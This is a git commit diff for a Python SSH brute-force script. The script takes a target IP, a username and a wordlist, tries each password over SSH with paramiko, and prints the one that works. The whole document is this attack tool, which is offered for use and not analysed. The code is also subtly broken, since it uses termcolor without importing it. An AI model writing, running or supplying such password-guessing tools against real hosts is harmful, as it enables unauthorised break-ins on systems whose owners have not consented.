9d222884f84c303b000949bc82bc1956255e5aee
Z333RO <82729059+Z333RO@users.noreply.github.com>
2022-11-21 21:16:26 -0800

    Update ssh_bruteforce.py

--- ssh_bruteforce.py
+++ ssh_bruteforce.py
@@ -1,11 +1,11 @@
-import paramiko, sys, os, socket,
+import paramiko, sys, os, socket
 
-def ssh_connect(passw, code=0):
+def ssh_connect(password, code=0):
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
     try:
-        ssh.connect(host, port=22, username=username, passw=passw)
+        ssh.connect(host, port=22, username=username, password=password)
     except paramiko.AuthenticationException:
         code = 1
     except socket.error as e:
@@ -17,15 +17,25 @@ def ssh_connect(passw, code=0):
 host = input('[+] Enter the IP of target: ')
 username = input('[+] Enter the SSH username: ')
 wordlist = input('[+] Path to wordlist: ')
+print('\n')
 
 if os.path.exists(wordlist) == False:
     print('[!!] Invalid path or wordlist not found. ')
     sys.exit(1)
 
 with open(wordlist, 'r') as file:
-    for line in file.readlines()
-        passw = line.strip()
-            try:
-                response = ssh_connect(passw)
-
-                
+    for line in file.readlines():
+        password = line.strip()
+        try:
+            response = ssh_connect(password)
+            if response == 0:
+                print(termcolor.colored(('[+] Password is: ' + password + ', for user: ' + username), 'yellow'))
+                break
+            elif response == 1:
+                print('[-] bad login: ' + password)
+            elif response == 2:
+                print('[!!] Unable to connect to target.')
+                sys.exit(1)
+        except Exception as e:
+            print(e)
+            pass
